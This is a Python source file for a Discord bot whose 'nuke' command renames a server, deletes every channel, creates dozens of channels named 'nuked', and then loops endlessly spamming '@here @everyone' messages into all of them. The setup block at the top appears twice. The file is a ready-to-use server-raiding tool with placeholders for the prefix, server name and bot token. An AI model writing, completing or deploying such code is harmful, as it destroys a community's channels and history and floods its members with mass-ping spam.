import discord
from discord.ext import commands

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="PREFIX_HERE", intents=intents)

@bot.event
async def on_ready():
    print(f"We have logged in as {bot.user}")
import discord
from discord.ext import commands
import asyncio

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="PREFIX_HERE", intents=intents)

@bot.event
async def on_ready():
    print(f"We have logged in as {bot.user}")

@bot.command()
async def cambiar_nombre_servidor(ctx, nuevo_nombre):
    guild = ctx.guild
    await guild.edit(name=nuevo_nombre)
    await ctx.send(f"El nombre del servidor se ha cambiado a {nuevo_nombre}.")

@bot.command()
async def nuke(ctx):
    guild = ctx.guild

    nuevo_nombre = "NEW_NAME_OF_SERVER"  # Cambia "Nuevo Nombre" por el nombre que deseas

    # Change server name
    await guild.edit(name=nuevo_nombre)
    await ctx.send(f"El nombre del servidor se ha cambiado a {nuevo_nombre}.")

    # Delete all channels
    for channel in guild.channels:
        await channel.delete()

    # Create new channels
    channel_names = ["nuked", "nuked", "nuked", "nuked", "nuked", "nuked", "nuked", "nuked", "nuked", "nuked", "nuked", "nuked", "nuked", "nuked", "nuked", "nuked", "nuked", "nuked", "nuked", "nuked", "nuked", "nuked", "nuked", "nuked", "nuked", "nuked", "nuked", "nuked", "nuked", "nuked", "nuked", "nuked", "nuked", "nuked", "nuked", "nuked", "nuked", "nuked", "nuked", "nuked", "nuked", "nuked", "nuked", "nuked", "nuked", "nuked", "nuked", "nuked", "nuked", "nuked", "nuked"]  # Add more channel names if desired
    for name in channel_names:
        await guild.create_text_channel(name)

    # Spam messages in all channels
    spam_content = "@here @everyone yall got nuked"

    while True:
        for channel in guild.channels:
            await channel.send(spam_content)
            await asyncio.sleep(0.3)  # Adjust the interval between messages if desired

bot.run("bot_token_here")
